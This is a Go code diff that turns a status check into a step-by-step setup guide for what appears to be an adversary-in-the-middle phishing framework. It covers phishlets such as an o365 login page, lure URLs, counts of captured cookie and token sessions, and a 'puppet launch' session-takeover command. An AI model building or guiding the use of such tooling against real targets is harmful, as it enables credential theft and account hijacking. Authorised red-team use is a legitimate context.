@@ -2030,11 +2030,97 @@ func (t *Terminal) tokensToJSON(tokens map[string]string) string {
 }
 
 func (t *Terminal) checkStatus() {
-	if t.cfg.GetBaseDomain() == "" {
-		log.Warning("server domain not set! type: config domain <domain>")
-	}
+	cyan := color.New(color.FgCyan)
+	dgray := color.New(color.FgWhite)
+	yellow := color.New(color.FgYellow)
+	higreen := color.New(color.FgHiGreen)
+
+	// Step 1: External IP
 	if t.cfg.GetServerExternalIP() == "" {
-		log.Warning("server external ip not set! type: config ipv4 external <external_ipv4_address>")
+		log.Warning("server external IP not set")
+		log.Info("%s  %s", dgray.Sprint("step 1 →"), cyan.Sprint("config ipv4 external <your_server_ip>"))
+		return
+	}
+
+	// Step 2: Domain
+	if t.cfg.GetBaseDomain() == "" {
+		log.Warning("server domain not set")
+		log.Info("%s  %s", dgray.Sprint("step 2 →"), cyan.Sprint("config domain <yourdomain.com>"))
+		log.Info("%s  make sure your domain's DNS A records point to %s", dgray.Sprint("       "), yellow.Sprint(t.cfg.GetServerExternalIP()))
+		return
+	}
+
+	// Step 3: Check if any phishlets are enabled
+	enabledCount := 0
+	hasPhishlets := false
+	for _, name := range t.cfg.GetPhishletNames() {
+		hasPhishlets = true
+		if t.cfg.IsSiteEnabled(name) {
+			enabledCount++
+		}
+	}
+
+	if !hasPhishlets {
+		log.Warning("no phishlets found in phishlets directory")
+		log.Info("%s  add .yaml phishlet files to the phishlets/ directory and restart", dgray.Sprint("step 3 →"))
+		return
+	}
+
+	if enabledCount == 0 {
+		// Check if any phishlet has a hostname set
+		hasHostname := false
+		for _, name := range t.cfg.GetPhishletNames() {
+			if h, ok := t.cfg.GetSiteDomain(name); ok && h != "" {
+				hasHostname = true
+				break
+			}
+		}
+		if !hasHostname {
+			log.Info("%s  %s", dgray.Sprint("step 3 →"), cyan.Sprint("phishlets hostname <name> <hostname>"))
+			log.Info("%s  example: %s", dgray.Sprint("       "), cyan.Sprint("phishlets hostname o365 login."+t.cfg.GetBaseDomain()))
+		}
+		log.Info("%s  %s", dgray.Sprint("step 4 →"), cyan.Sprint("phishlets enable <name>"))
+		log.Info("%s  run %s to see available phishlets", dgray.Sprint("       "), cyan.Sprint("phishlets"))
+		return
+	}
+
+	// Step 5: Check if any lures exist
+	if len(t.cfg.lures) == 0 {
+		enabledName := ""
+		for _, name := range t.cfg.GetPhishletNames() {
+			if t.cfg.IsSiteEnabled(name) {
+				enabledName = name
+				break
+			}
+		}
+		log.Info("%s  %s", dgray.Sprint("step 5 →"), cyan.Sprint("lures create "+enabledName))
+		log.Info("%s  then: %s", dgray.Sprint("       "), cyan.Sprint("lures get-url 0"))
+		return
+	}
+
+	// Step 6: Check for captured sessions
+	sessions, err := t.db.ListSessions()
+	capturedCount := 0
+	if err == nil {
+		for _, s := range sessions {
+			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
+				capturedCount++
+			}
+		}
+	}
+
+	// All set — show a brief status summary
+	log.Info("%s  %s phishlet(s) active, %s lure(s), %s session(s) captured",
+		higreen.Sprint("✓ ready"),
+		cyan.Sprint(strconv.Itoa(enabledCount)),
+		cyan.Sprint(strconv.Itoa(len(t.cfg.lures))),
+		cyan.Sprint(strconv.Itoa(capturedCount)))
+
+	if capturedCount > 0 && t.puppet != nil {
+		log.Info("%s  use %s to view sessions, %s to take over",
+			dgray.Sprint("       "),
+			cyan.Sprint("sessions"),
+			cyan.Sprint("puppet launch <session_id> <url>"))
 	}
 }
 
